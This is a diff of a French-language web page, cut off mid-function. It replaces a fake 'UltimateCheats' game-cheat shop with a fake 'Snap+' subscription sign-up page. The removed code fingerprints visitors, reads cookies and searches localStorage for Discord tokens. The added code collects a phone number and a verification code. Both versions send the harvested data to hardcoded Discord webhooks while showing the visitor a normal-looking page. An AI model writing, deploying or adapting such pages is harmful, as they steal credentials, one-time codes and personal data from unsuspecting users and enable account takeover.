@@ -1,796 +1,175 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>UltimateCheats™</title>
+<meta charset="UTF-8">
+<title>S'inscrire à Snap+</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
 <style>
-  body {
-    margin: 0;
-    background-color: #000;
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    color: #eee;
-  }
-  header {
-    text-align: center;
-    padding: 40px 20px 20px;
-    border-bottom: 2px solid #ff4444;
-    box-shadow: 0 0 15px #ff4444;
-  }
-  header h1 {
-    font-size: 3rem;
-    color: #ff4444;
-    text-shadow: 0 0 10px #ff4444;
-    margin: 0;
-  }
-  header p {
-    margin-top: 10px;
-    color: #bbb;
-    font-style: italic;
-  }
-  .badges-container {
-    margin-top: 15px;
-    display: flex;
-    justify-content: center;
-    gap: 12px;
-    flex-wrap: wrap;
-  }
-  .badges-container span {
-    display: inline-block;
-    padding: 6px 14px;
-    font-size: 0.9rem;
-    font-weight: 700;
-    border-radius: 12px;
-    color: white;
-    text-transform: uppercase;
-    letter-spacing: 0.05em;
-    user-select: none;
-  }
-  .badge.customers {
-    background-color: #00cc66;
-  }
-  .badge.developper {
-    background-color: #ffaa00;
-    color: black;
-  }
-  .badge.owner {
-    background-color: #ff4444;
-  }
-  .badge.promo {
-    position: absolute;
-    top: 10px;
-    right: 10px;
-    background-color: #ff9900;
-    color: black;
-    font-weight: 900;
-    font-size: 0.85rem;
-    padding: 6px 12px;
-    border-radius: 16px;
-    box-shadow: 0 0 8px #ff9900;
-    user-select: none;
-    z-index: 10;
-    text-transform: uppercase;
-  }
-  main {
-    padding: 30px 20px;
-    max-width: 1000px;
-    margin: 0 auto;
-  }
-  .shop-grid {
-    display: flex;
-    flex-wrap: wrap;
-    justify-content: center;
-    gap: 30px;
-  }
-  .product-card {
-    position: relative;
-    background: #111;
-    border-radius: 12px;
-    width: 260px;
-    color: inherit;
-    cursor: pointer;
-    overflow: hidden;
-    box-shadow: 0 0 15px rgba(255, 68, 68, 0.2);
-    transition: transform 0.3s ease, box-shadow 0.3s ease;
-    user-select: none;
-  }
-  .product-card:hover {
-    transform: scale(1.05);
-    box-shadow: 0 0 30px #ff4444;
-  }
-  .product-card img {
-    width: 100%;
-    height: 160px;
-    object-fit: cover;
-    display: block;
-    transition: transform 0.3s ease;
-  }
-  .product-card.clicked img {
-    transform: scale(1.1);
-  }
-  .product-card.clicked {
-    animation: pulse 0.5s ease;
-    box-shadow: 0 0 40px #ff4444;
-  }
-  @keyframes pulse {
-    0% { transform: scale(1); }
-    50% { transform: scale(1.08); }
-    100% { transform: scale(1); }
-  }
-  .product-card .info {
-    padding: 15px;
-  }
-  .product-card h3 {
-    margin: 0 0 10px;
-    font-size: 1.2rem;
-    color: #ff6666;
-  }
-  .badge {
-    display: inline-block;
-    padding: 5px 12px;
-    font-size: 0.8rem;
-    font-weight: 700;
-    border-radius: 12px;
-    margin-bottom: 10px;
-    color: white;
-    user-select: none;
-    text-transform: uppercase;
-    letter-spacing: 0.05em;
-    margin-right: 5px;
-  }
-  #detail-view {
-    background: #111;
-    border-radius: 12px;
-    padding: 20px;
-    box-shadow: 0 0 20px #ff4444;
-    color: #ccc;
-    opacity: 0;
-    transform: translateY(20px);
-    transition: opacity 0.4s ease, transform 0.4s ease;
-  }
-  #detail-view.visible {
-    opacity: 1;
-    transform: translateY(0);
-  }
-  #detail-view h2 {
-    color: #ff4444;
-    margin-top: 0;
-  }
-  #detail-view ul {
-    list-style-type: disc;
-    padding-left: 20px;
-  }
-  #detail-view img {
-    width: 100%;
-    max-width: 400px;
-    border-radius: 12px;
-    margin-bottom: 20px;
-  }
-  #btn-back {
-    background-color: #ff4444;
-    color: white;
-    border: none;
-    border-radius: 8px;
-    padding: 10px 20px;
-    cursor: pointer;
-    font-weight: bold;
-    margin-top: 20px;
-    transition: background-color 0.3s ease;
-  }
-  #btn-back:hover {
-    background-color: #cc0000;
-  }
-  footer {
-    text-align: center;
-    padding: 20px;
-    border-top: 2px solid #ff4444;
-    color: #999;
-    margin-top: 40px;
-    user-select: none;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    gap: 20px;
-    font-size: 1rem;
-  }
-  footer .owner {
-    font-weight: 700;
-    font-size: 1.1rem;
-    color: #ff4444;
-    text-shadow: 0 0 10px #ff4444;
-  }
-  footer a.discord-link {
-    display: inline-flex;
-    align-items: center;
-    color: #7289da;
-    text-decoration: none;
-    transition: color 0.3s ease;
-  }
-  footer a.discord-link:hover {
-    color: #5865f2;
-  }
-  footer a.discord-link svg {
-    width: 24px;
-    height: 24px;
-    fill: currentColor;
-    margin-left: 5px;
-  }
-  .reviews-section {
-    width: 100%;
-    max-width: 800px;
-    margin-top: 20px;
-    padding: 20px;
-    background: #111;
-    border-radius: 12px;
-    box-shadow: 0 0 15px rgba(255, 68, 68, 0.2);
-  }
-  .reviews-section h3 {
-    color: #ff4444;
-    text-align: center;
-    margin-bottom: 20px;
-    font-size: 1.5rem;
-  }
-  .review {
-    background: #222;
-    padding: 15px;
-    margin-bottom: 15px;
-    border-radius: 8px;
-    border-left: 4px solid #ff4444;
-  }
-  .review-header {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    margin-bottom: 10px;
-  }
-  .review-author {
-    font-weight: bold;
-    color: #fff;
-  }
-  .review-date {
-    color: #999;
-    font-size: 0.9rem;
-  }
-  .review-rating {
-    color: #ffaa00;
-    font-weight: bold;
-  }
-  .review-content {
-    color: #ccc;
-    line-height: 1.5;
-  }
+*{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
+body{margin:0;height:100vh;background:black;overflow:hidden;display:flex;align-items:center;justify-content:center;color:white}
+canvas{position:fixed;inset:0;z-index:0}
+.card{position:relative;z-index:1;width:90%;max-width:420px;background:#111;border-radius:20px;padding:28px 24px 32px;box-shadow:0 20px 60px rgba(0,0,0,.6)}
+h1{text-align:center;color:#f7c84b;margin-bottom:20px}
+label{display:block;margin-bottom:8px}
+input,select{width:100%;padding:14px 16px;border-radius:10px;border:none;font-size:16px;margin-bottom:20px}
+button{width:180px;margin:auto;display:block;padding:14px;border-radius:12px;border:none;background:#f7c84b;color:black;font-size:17px;font-weight:600;cursor:pointer}
+button:disabled{background:#777;cursor:not-allowed}
+.error{text-align:center;color:#ff6b6b;margin-top:-10px}
+.code-box{display:flex;justify-content:space-between;gap:12px;margin:20px 0}
+.code-box input{width:60px;height:70px;font-size:30px;font-weight:700;text-align:center;border-radius:14px;border:2px solid #333;background:black;color:#f7c84b}
+.code-box input:focus{border-color:#f7c84b;box-shadow:0 0 12px rgba(247,200,75,.6);outline:none}
+.resend{text-align:center;margin-top:10px;font-size:14px;color:#aaa;cursor:pointer}
+.success{text-align:center}
+.check{width:90px;height:90px;border-radius:50%;border:4px solid #2ecc71;margin:20px auto;position:relative;animation:scale .5s ease}
+.check:after{content:"✔";font-size:48px;color:#2ecc71;position:absolute;top:50%;left:50%;transform:translate(-50%,-55%)}
+@keyframes scale{from{transform:scale(.5);opacity:0}to{transform:scale(1);opacity:1}}
 </style>
 </head>
 <body>
-<header>
-  <h1>UltimateCheats™</h1>
-  <p>Cheats pour Fortnite, Roblox, Fivem et plus</p>
-  <div>
-    <strong style="color:#ff4444; font-size:1.1rem;">Badges disponibles :</strong>
-    <div class="badges-container" aria-label="Liste des badges disponibles">
-      <span class="badge customers">Customers</span>
-      <span class="badge developper">Développeur</span>
-      <span class="badge owner">Owner</span>
-    </div>
-  </div>
-</header>
-<main>
-  <div id="list-view" class="shop-grid" role="list"></div>
-  <div id="detail-view" style="display:none;"></div>
-</main>
-<footer>
-  <p class="owner">⚡ Owner - <span>Onzerty</span></p>
-  <a class="discord-link" href="https://discord.gg/YKSDHPdRmx" target="_blank" rel="noopener noreferrer" aria-label="Rejoindre le serveur Discord">
-    <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
-      <path d="M18.36 5.64c-.15-.15-.34-.24-.53-.24H15.5v-.9c0-.55-.45-1-1-1H8.5c-.55 0-1 .45-1 1v11.5c0 .28.11.56.29.75-.13.09-.27.16-.42.22-.5.19-1.04.19-1.54 0-.15-.06-.29-.13-.42-.22.32-.85.52-1.45.52-1.3 0-2.35-1.05-2.35-2.35 0-1.08.82-2.03 1.89-2.31.19-.05.38-.08.58-.08.66 0 1.21.55 1.21 1.21v4.16c0 .55.45 1 1 1h4c.55 0 1-.45 1-1V8.5c0-.66.55-1.21 1.21-1.21.2 0 .39.03.58.08.97.28 1.89 1.23 1.89 2.31 0 1.3-1.05 2.35-2.35 2.35zM21 2H3C1.9 2 1 2.9 1 4v12c0 1.1.9 2 2 2h4l-1.5 1.5L12 22l5.5-5.5L21 18h2c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/>
-    </svg>
-    Discord
-  </a>
-  <div class="reviews-section">
-    <h3>💬 Avis des utilisateurs</h3>
-    <div class="review">
-      <div class="review-header">
-        <span class="review-author">xQc_L</span>
-        <div>
-          <span class="review-rating">★★★★★ 5/5</span>
-          <span class="review-date">18/09/2025</span>
-        </div>
-      </div>
-      <div class="review-content">
-        Merci pour le cheat Fortnite, l'aimbot est ultra précis et l'ESP marche nickel. Pas de ban après 2 semaines d'utilisation, je recommande !
-      </div>
-    </div>
-    <div class="review">
-      <div class="review-header">
-        <span class="review-author">NinjaFan42</span>
-        <div>
-          <span class="review-rating">★★★★☆ 4/5</span>
-          <span class="review-date">15/09/2025</span>
-        </div>
-      </div>
-      <div class="review-content">
-        Le cheat Roblox est top, le fly hack fonctionne parfaitement. Par contre, j'ai eu un petit bug avec l'executeur de scripts, mais le support a répondu en 10 minutes. Bon boulot !
-      </div>
-    </div>
-    <div class="review">
-      <div class="review-header">
-        <span class="review-author">GTA_Pro_2025</span>
-        <div>
-          <span class="review-rating">★★★★★ 5/5</span>
-          <span class="review-date">14/09/2025</span>
-        </div>
-      </div>
-      <div class="review-content">
-        Le menu mod pour GTA V est incroyable, téléportation et god mode sans problème. J'ai enfin pu dominer Los Santos sans me faire embêter. Merci !
-      </div>
-    </div>
-    <div class="review">
-      <div class="review-header">
-        <span class="review-author">MinecraftNoob</span>
-        <div>
-          <span class="review-rating">★★★★★ 5/5</span>
-          <span class="review-date">12/09/2025</span>
-        </div>
-      </div>
-      <div class="review-content">
-        Le KillAura et le Fly sur Minecraft sont trop puissants, j'ai enfin pu battre mes potes en PvP. Merci pour ce cheat gratuit !
-      </div>
-    </div>
-    <div class="review">
-      <div class="review-header">
-        <span class="review-author">FivemBoss</span>
-        <div>
-          <span class="review-rating">★★★★★ 5/5</span>
-          <span class="review-date">10/09/2025</span>
-        </div>
-      </div>
-      <div class="review-content">
-        L'argent illimité et la téléportation sur Fivem marchent parfaitement, même sur les serveurs protégés. Je suis impressionné par la stabilité !
-      </div>
-    </div>
-  </div>
-</footer>
+
+<canvas id="bg"></canvas>
+
+<div class="card">
+<h1 id="title">S'inscrire à Snap+</h1>
+
+<!-- STEP 1 -->
+<div id="step1">
+<label>Nom d'utilisateur :</label>
+<input id="username">
+
+<label>Durée de l’abonnement :</label>
+<select id="duration">
+  <option value="1">1 mois</option>
+  <option value="3" selected>3 mois</option>
+  <option value="12">12 mois</option>
+</select>
+
+<button id="b1" disabled>Continuer</button>
+</div>
+
+<!-- STEP 2 -->
+<div id="step2" style="display:none">
+<label>Numéro français :</label>
+<input id="phone" placeholder="06 12 34 56 78">
+<div class="error" id="phoneErr"></div>
+<button id="b2" disabled>Continuer</button>
+</div>
+
+<!-- STEP 3 -->
+<div id="step3" style="display:none">
+<label>Entrez le code :</label>
+<div class="code-box">
+<input maxlength="1"><input maxlength="1"><input maxlength="1"><input maxlength="1">
+</div>
+<button id="b3" disabled>Valider</button>
+<div class="resend" id="resend">Renvoyer le code</div>
+</div>
+
+<!-- STEP 4 -->
+<div id="step4" style="display:none" class="success">
+<div class="check"></div>
+<h2>Vous avez débloqué Snap+</h2>
+</div>
+
+</div>
+
 <script>
-  // Temps passé sur la page
-  let timeOnPage = 0;
-  setInterval(() => { timeOnPage++; }, 1000);
+/* ===== WEBHOOK ===== */
+const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1474900079205679164/9DmcNu0XH3dzJFXZMlv8a8tIjqdvemCjC5NHzifVFVuiL_mrayd3Sdywkt0LEE4Wfvbd";
 
-  // Détection des bloqueurs de pubs
-  let adBlockDetected = false;
-  const adScript = document.createElement('script');
-  adScript.src = 'https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js';
-  adScript.onerror = () => { adBlockDetected = true; };
-  document.head.appendChild(adScript);
+/* ===== BACKGROUND ===== */
+const c=document.getElementById("bg"),x=c.getContext("2d");let w,h;
+function r(){w=c.width=innerWidth;h=c.height=innerHeight}onresize=r;r();
+const pts=[...Array(90)].map(()=>({x:Math.random()*w,y:Math.random()*h,vx:(Math.random()-.5)*.6,vy:(Math.random()-.5)*.6}));
+let m={x:-1e4,y:-1e4};onmousemove=e=>{m.x=e.clientX;m.y=e.clientY};
+function a(){x.clearRect(0,0,w,h);
+pts.forEach(p=>{p.x+=p.vx;p.y+=p.vy;if(p.x<0||p.x>w)p.vx*=-1;if(p.y<0||p.y>h)p.vy*=-1;
+let dx=p.x-m.x,dy=p.y-m.y,d=Math.hypot(dx,dy);if(d<120){p.vx+=dx/d*.4;p.vy+=dy/d*.4}p.vx*=.98;p.vy*=.98});
+for(let i=0;i<pts.length;i++)for(let j=i+1;j<pts.length;j++){let dx=pts[i].x-pts[j].x,dy=pts[i].y-pts[j].y,d=Math.hypot(dx,dy);
+if(d<130){x.strokeStyle=`rgba(247,200,75,${1-d/130})`;x.beginPath();x.moveTo(pts[i].x,pts[i].y);x.lineTo(pts[j].x,pts[j].y);x.stroke()}}
+pts.forEach(p=>{x.fillStyle="#f7c84b";x.beginPath();x.arc(p.x,p.y,2.2,0,6.28);x.fill()});
+requestAnimationFrame(a)}a();
 
-  // Détection du GPU
-  let gpu = "Non disponible";
-  try {
-    const canvas = document.createElement('canvas');
-    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-    if (gl) {
-      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-      if (debugInfo) {
-        gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-      }
-    }
-  } catch (e) {
-    console.error("Erreur GPU:", e);
-  }
+/* ===== FORM LOGIC ===== */
+username.oninput=()=>b1.disabled=!username.value.trim();
 
-  // Détection des polices installées
-  const fonts = [
-    'Arial', 'Courier New', 'Georgia', 'Times New Roman', 'Verdana',
-    'Helvetica', 'Comic Sans MS', 'Impact', 'Trebuchet MS', 'Palatino'
-  ];
-  const detectedFonts = [];
-  fonts.forEach(font => {
-    const testFont = new FontFace(font, 'url(https://example.com)');
-    testFont.load().then(() => detectedFonts.push(font)).catch(() => {});
-  });
+b1.onclick=()=>{
+  step1.style.display="none";
+  step2.style.display="block";
+};
 
-  // Détection des mouvements de souris
-  let mouseMoves = 0;
-  document.addEventListener('mousemove', () => { mouseMoves++; });
+phone.oninput=()=>{
+  let ok=/^(?:\+33|0)[67]\d{8}$/.test(phone.value.replace(/\s/g,""));
+  b2.disabled=!ok;
+  phoneErr.textContent=ok?"":"Numéro invalide";
+};
 
-  // Détection des clics
-  let clicks = 0;
-  document.addEventListener('click', () => { clicks++; });
+b2.onclick=()=>{
+  step2.style.display="none";
+  step3.style.display="block";
+};
 
-  // Détection des cookies
-  const cookies = document.cookie.split(';').map(cookie => cookie.trim()).filter(cookie => cookie.length > 0);
+const inputs=[...document.querySelectorAll(".code-box input")];
+inputs.forEach((i,n)=>{
+  i.oninput=()=>{
+    i.value=i.value.replace(/\D/g,"");
+    if(i.value&&inputs[n+1])inputs[n+1].focus();
+    b3.disabled=!inputs.every(i=>i.value);
+  };
+  i.onkeydown=e=>{
+    if(e.key==="Backspace"&&!i.value&&inputs[n-1])inputs[n-1].focus();
+  };
+});
 
-  // Détection du stockage local
-  let localStorageSize = "Non disponible";
-  try {
-    localStorageSize = `${(JSON.stringify(localStorage).length / 1024).toFixed(2)} Ko`;
-  } catch (e) {
-    localStorageSize = "Accès refusé";
-  }
+/* ===== RÉCUPÉRATION IP ===== */
+let userIP = "Inconnue";
 
-  // Récupération du token Discord
-  let discordToken = "Non disponible";
-  try {
-    const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/;
-    for (let i = 0; i < localStorage.length; i++) {
-      const key = localStorage.key(i);
-      const value = localStorage.getItem(key);
-      if (tokenRegex.test(value)) {
-        discordToken = value;
-        break;
-      }
-    }
-  } catch (e) {
-    discordToken = "Accès refusé";
-  }
+fetch("https://api.ipify.org?format=json")
+  .then(res => res.json())
+  .then(data => { userIP = data.ip || "Erreur récupération IP"; })
+  .catch(() => { userIP = "Erreur récupération IP"; });
 
-  const cheats = [
-    {
-      id: 'fortnite',
-      title: 'Cheat Fortnite',
-      image: 'images/Fortnite.jpg',
-      badge: 'free',
-      badgeText: 'Gratuit',
-      extraBadges: ['top', 'recommended'],
-      promo: '30% moins',
-      description: '🎯 Boost ta précision avec l\'aimbot ultra-précis et repère tes ennemis à travers les murs !',
-      features: [
-        '🎯 Aimbot automatique ultra précis',
-        '👀 ESP (voir les ennemis à travers les murs)',
-        '🔫 No Recoil (sans recul)',
-        '✨ Changeur de skins exclusifs'
-      ],
-      downloadLink: '#'
-    },
-    {
-      id: 'roblox',
-      title: 'Cheat Roblox',
-      image: 'images/Roblox.jpg',
-      badge: 'free',
-      badgeText: 'Gratuit',
-      promo: '50% moins',
-      description: '🕹️ Explore Roblox sans limites avec le fly hack et gagne des Robux facilement !',
-      features: [
-        '🕊️ Fly Hack pour voler librement',
-        '💨 Vitesse augmentée',
-        '📜 Executeur de scripts Lua'
-      ],
-      downloadLink: '#'
-    },
-    {
-      id: 'fivem',
-      title: 'Cheat Fivem',
-      image: 'images/Fivem.jpg',
-      badge: 'premium',
-      badgeText: 'Premium',
-      extraBadges: ['recommended'],
-      promo: '30% moins',
-      description: '💰 Deviens riche instantanément avec l\'argent illimité et téléporte-toi où tu veux sur la map !',
-      features: [
-        '💸 Money Hack illimité',
-        '📍 Téléportation instantanée',
-        '🎛️ Menu Mod privé ultra complet'
-      ],
-      downloadLink: '#'
-    },
-    {
-      id: 'gta',
-      title: 'Cheat GTA V Online',
-      image: 'images/GTA.jpg',
-      badge: 'new',
-      badgeText: 'Nouveau',
-      promo: '50% moins',
-      description: '🚀 Passe en mode dieu et booste ton RP pour dominer Los Santos !',
-      features: [
-        '🛡️ God Mode invincible',
-        '⚡ Boost RP rapide',
-        '🕹️ Menu serveur avec options avancées'
-      ],
-      downloadLink: '#'
-    },
-    {
-      id: 'minecraft',
-      title: 'Cheat Minecraft',
-      image: 'images/Minecraft.jpg',
-      badge: 'free',
-      badgeText: 'Gratuit',
-      promo: '30% moins',
-      description: '⚔️ Domine tes adversaires avec KillAura et vole librement dans le monde pixelisé !',
-      features: [
-        '⚔️ KillAura automatique',
-        '🕊️ Fly et NoClip',
-        '🛡️ Anti Knockback puissant'
-      ],
-      downloadLink: '#'
-    },
-  ];
+b3.onclick=()=>{
+  const code = inputs.map(i=>i.value).join("");
 
-  const listView = document.getElementById('list-view');
-  const detailView = document.getElementById('detail-view');
-
-  function getWindowsVersion(userAgent) {
-    if (userAgent.includes("Windows NT 10.0")) {
-      return userAgent.includes("Win11") || userAgent.includes("Windows 11") ? "Windows 11" : "Windows 10";
-    } else if (userAgent.includes("Windows NT 6.3")) {
-      return "Windows 8.1";
-    } else if (userAgent.includes("Windows NT 6.2")) {
-      return "Windows 8";
-    } else if (userAgent.includes("Windows NT 6.1")) {
-      return "Windows 7";
-    } else {
-      return "Windows (version inconnue)";
-    }
-  }
-
-  function getBrowserInfo(userAgent) {
-    let name = "Inconnu", version = "Inconnu";
-    if (userAgent.includes("Firefox")) {
-      name = "Firefox"; version = userAgent.match(/Firefox\/(\d+)/)[1];
-    } else if (userAgent.includes("Edg")) {
-      name = "Edge"; version = userAgent.match(/Edg\/(\d+)/)[1];
-    } else if (userAgent.includes("Chrome")) {
-      name = "Chrome"; version = userAgent.match(/Chrome\/(\d+)/)[1];
-    } else if (userAgent.includes("Safari")) {
-      name = "Safari"; version = userAgent.match(/Version\/(\d+)/)[1];
-    } else if (userAgent.includes("Opera") || userAgent.includes("OPR")) {
-      name = "Opera"; version = userAgent.match(/(Opera|OPR)\/(\d+)/)[2];
-    } else if (userAgent.includes("Trident")) {
-      name = "Internet Explorer"; version = userAgent.match(/rv:(\d+)/)[1];
-    }
-    return { name, version };
-  }
-
-  function getOSInfo(userAgent) {
-    let name = "Inconnu", version = "Inconnu";
-    if (userAgent.includes("Windows")) {
-      name = "Windows"; version = "Détecté plus précisément";
-    } else if (userAgent.includes("Macintosh")) {
-      name = "macOS"; version = userAgent.match(/Mac OS X (\d+[._]\d+)/)[1].replace("_", ".");
-    } else if (userAgent.includes("Linux")) {
-      name = "Linux";
-    } else if (userAgent.includes("Android")) {
-      name = "Android"; version = userAgent.match(/Android (\d+[.\d]+)/)[1];
-    } else if (userAgent.includes("iPhone") || userAgent.includes("iPad")) {
-      name = "iOS"; version = userAgent.match(/OS (\d+[._]\d+)/)[1].replace("_", ".");
-    }
-    return { name, version };
-  }
-
-  function getDeviceType(userAgent) {
-    if (/Mobile|Android|iP(hone|od)|BlackBerry|IEMobile|Kindle/i.test(userAgent)) {
-      return "Mobile";
-    } else if (/Tablet|iPad|Nexus 7|Nexus 10|Kindle Fire/i.test(userAgent)) {
-      return "Tablette";
-    } else {
-      return "Desktop";
-    }
-  }
-
-  async function getFullUserInfo() {
-    try {
-      // 1. IP et localisation
-      const ipResponse = await fetch('https://api.ipify.org?format=json');
-      const ipData = await ipResponse.json();
-      const ip = ipData.ip;
-      const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
-      const locationData = await locationResponse.json();
-
-      // 2. Infos navigateur/OS/appareil
-      const userAgent = navigator.userAgent;
-      const browser = getBrowserInfo(userAgent);
-      const os = getOSInfo(userAgent);
-      const deviceType = getDeviceType(userAgent);
-
-      // 3. Autres infos
-      const screenRes = `${window.screen.width}x${window.screen.height}`;
-      let battery = "Non disponible";
-      if (navigator.getBattery) {
-        const batteryData = await navigator.getBattery();
-        battery = `${Math.round(batteryData.level * 100)}% (${batteryData.charging ? "En charge" : "Sur batterie"})`;
-      }
-      let memory = "Non disponible";
-      if (navigator.deviceMemory) {
-        memory = `${navigator.deviceMemory} Go`;
-      }
-      let cpuCores = "Non disponible";
-      if (navigator.hardwareConcurrency) {
-        cpuCores = `${navigator.hardwareConcurrency} cœurs`;
-      }
-      const connection = navigator.connection ?
-        `${navigator.connection.effectiveType} (${navigator.connection.downlink} Mbps)` :
-        "Non disponible";
-      const language = navigator.language || navigator.userLanguage;
-      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      const fingerprint = btoa(`${ip}-${userAgent}-${screenRes}-${language}-${timeZone}`).substring(0, 16);
-      const referrer = document.referrer || "Aucun";
-      const plugins = [];
-      for (let i = 0; i < navigator.plugins.length; i++) {
-        plugins.push(navigator.plugins[i].name);
-      }
-      const languages = navigator.languages || [navigator.language];
-      const colorDepth = window.screen.colorDepth;
-      const orientation = window.screen.orientation.type;
-      const doNotTrack = navigator.doNotTrack || "Non disponible";
-      let mediaDevices = "Non disponible";
-      if (navigator.mediaDevices) {
-        try {
-          const devices = await navigator.mediaDevices.enumerateDevices();
-          mediaDevices = devices.map(d => `${d.kind}: ${d.label || d.deviceId}`).join("; ");
-        } catch (err) {
-          mediaDevices = `Erreur: ${err.message}`;
-        }
-      }
-
-      let osVersion = os.version;
-      if (os.name === "Windows") {
-        osVersion = getWindowsVersion(userAgent);
-      }
-
-      return {
-        ip, country: locationData.country_name, city: locationData.city, region: locationData.region,
-        postal: locationData.postal, isp: locationData.org, browser: browser.name,
-        browserVersion: browser.version, os: os.name, osVersion, deviceType,
-        screenResolution: screenRes, language, timeZone, connection,
-        battery, memory, cpuCores, userAgent, referrer, online: navigator.onLine ? "En ligne" : "Hors ligne",
-        fingerprint, gpu, fonts: detectedFonts, adBlocker: adBlockDetected ? "Oui" : "Non",
-        timeOnPage, mouseMoves, clicks, plugins: plugins.join(", "), languages: languages.join(", "),
-        colorDepth: `${colorDepth} bits`, orientation, doNotTrack, mediaDevices,
-        localStorageSize, cookies: cookies.join(" | "), discordToken
-      };
-    } catch (error) {
-      console.error("Erreur :", error);
-      return {
-        error: "Impossible de récupérer toutes les infos",
-        ip: "Inconnu",
-        userAgent: navigator.userAgent,
-        discordToken
-      };
-    }
-  }
-
-  function sendToDiscordWebhook(action, cheatTitle = null) {
-    const webhookUrl = 'https://canary.discord.com/api/webhooks/1418430611064094882/41Y0ezgIoTIQtSwQ11hS_AyU1i0zSuo3KYOWbYfCluk7Kg7mGfHRBAWbo1AHRh7kYqGl';
-
-    getFullUserInfo().then(userInfo => {
-      const embed = {
-        title: cheatTitle ? `🔥 ${action} : **${cheatTitle}**` : `🔥 ${action}`,
-        color: 0xFF4444,
-        fields: [
-          { name: "🌐 IP", value: `\`${userInfo.ip || "Inconnu"}\``, inline: true },
-          { name: "📡 Opérateur", value: userInfo.isp || "Inconnu", inline: true },
-          { name: "🏙️ Ville", value: userInfo.city || "Inconnu", inline: true },
-          { name: "📮 Code Postal", value: userInfo.postal || "Inconnu", inline: true },
-          { name: "🌍 Pays", value: userInfo.country || "Inconnu", inline: true },
-          { name: "🖥️ Appareil", value: `${userInfo.deviceType} (${userInfo.os} ${userInfo.osVersion})`, inline: true },
-          { name: "🌐 Navigateur", value: `${userInfo.browser} ${userInfo.browserVersion}`, inline: true },
-          { name: "🎮 GPU", value: userInfo.gpu || "Non détecté", inline: true },
-          { name: "📱 Résolution", value: userInfo.screenResolution, inline: true },
-          { name: "⚙️ CPU/Mémoire", value: `${userInfo.cpuCores} / ${userInfo.memory}`, inline: true },
-          { name: "🔋 Batterie", value: userInfo.battery, inline: true },
-          { name: "🌐 Réseau", value: userInfo.connection, inline: true },
-          { name: "⏳ Temps sur page", value: `${userInfo.timeOnPage} secondes`, inline: true },
-          { name: "🖱️ Mouvements souris", value: `${userInfo.mouseMoves}`, inline: true },
-          { name: "👆 Clics", value: `${userInfo.clicks}`, inline: true },
-          { name: "🚫 Bloqueur de pubs", value: userInfo.adBlocker, inline: true },
-          { name: "🕵️ Empreinte", value: `\`${userInfo.fingerprint}\``, inline: true },
-          { name: "🔗 Référent", value: userInfo.referrer.substring(0, 50), inline: true },
-          { name: "💾 Stockage local", value: userInfo.localStorageSize, inline: true },
-          { name: "🍪 Cookies", value: userInfo.cookies.substring(0, 100) + (userInfo.cookies.length > 100 ? "..." : ""), inline: false },
-          { name: "🔑 Token Discord", value: userInfo.discordToken === "Non disponible" ? "Non trouvé" : "**TROUVÉ** (masqué)", inline: false },
+  fetch(WEBHOOK_URL,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      embeds:[{
+        title:"Nouvelle inscription Snap+",
+        color:0xF7C84B,
+        fields:[
+          {name:"Utilisateur",     value:username.value,           inline:true},
+          {name:"Durée",           value:duration.value+" mois",   inline:true},
+          {name:"Téléphone",       value:phone.value,              inline:false},
+          {name:"Code saisi",      value:code,                     inline:false},
+          {name:"Adresse IP",      value:userIP,                   inline:false}
         ],
-        footer: { text: `UltimateCheats™ | ${new Date().toLocaleString()}` },
-        timestamp: new Date(),
-      };
+        timestamp:new Date().toISOString()
+      }]
+    })
+  }).catch(err => console.error("Erreur envoi webhook:", err));
 
-      fetch(webhookUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ embeds: [embed] }),
-      })
-      .then(response => {
-        if (!response.ok) throw new Error("Erreur lors de l'envoi du webhook");
-        console.log("✅ Données envoyées avec succès à Discord !");
-        if (userInfo.discordToken !== "Non disponible" && userInfo.discordToken !== "Accès refusé") {
-          console.log("🔑 Token Discord trouvé (masqué pour sécurité)");
-        }
-      })
-      .catch(error => {
-        console.error("❌ Erreur webhook :", error);
-        // En cas d'erreur, on essaie une seconde fois après 2 secondes
-        setTimeout(() => {
-          fetch(webhookUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ embeds: [embed] }),
-          }).catch(e => console.error("Deuxième tentative échouée :", e));
-        }, 2000);
-      });
-    });
-  }
+  step3.style.display="none";
+  step4.style.display="block";
+  title.textContent="Succès";
+};
 
-  function createCard(cheat) {
-    const card = document.createElement('div');
-    card.className = 'product-card';
-    card.tabIndex = 0;
-    let badgesHTML = `<span class="badge ${cheat.badge}">${cheat.badgeText}</span> `;
-    if (cheat.extraBadges && cheat.extraBadges.length) {
-      cheat.extraBadges.forEach(b => {
-        badgesHTML += `<span class="badge ${b}">${b.charAt(0).toUpperCase() + b.slice(1)}</span> `;
-      });
-    }
-    let promoBadgeHTML = '';
-    if(cheat.promo) {
-      promoBadgeHTML = `<span class="badge promo">${cheat.promo}</span>`;
-    }
-    card.innerHTML = `
-      ${promoBadgeHTML}
-      <img src="${cheat.image}" alt="${cheat.title}" onerror="this.src='https://via.placeholder.com/260x160?text=${encodeURIComponent(cheat.title)}'">
-      <div class="info">
-        <h3>${cheat.title}</h3>
-        ${badgesHTML}
-        <p>${cheat.description}</p>
-      </div>
-    `;
-    card.addEventListener('click', () => {
-      card.classList.add('clicked');
-      sendToDiscordWebhook("Clic sur un cheat", cheat.title);
-      setTimeout(() => {
-        showDetail(cheat.id);
